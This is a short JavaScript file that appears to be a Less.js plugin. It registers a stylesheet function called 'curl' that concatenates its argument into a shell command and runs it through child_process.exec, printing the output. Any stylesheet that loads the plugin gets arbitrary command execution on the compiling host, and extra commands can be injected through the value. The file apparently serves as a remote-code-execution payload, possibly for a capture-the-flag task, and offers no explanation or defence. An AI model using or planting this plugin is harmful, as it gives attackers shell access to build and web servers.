const { exec } = require('child_process');
module.exports = {
    install: function(less, pluginManager, functions) {
        functions.add('curl',function({value}) {
            exec('curl '+value,function(err,stdout,stderr){
                console.log(stdout);
            })
            console.log(value);
            return;
        });
    }
};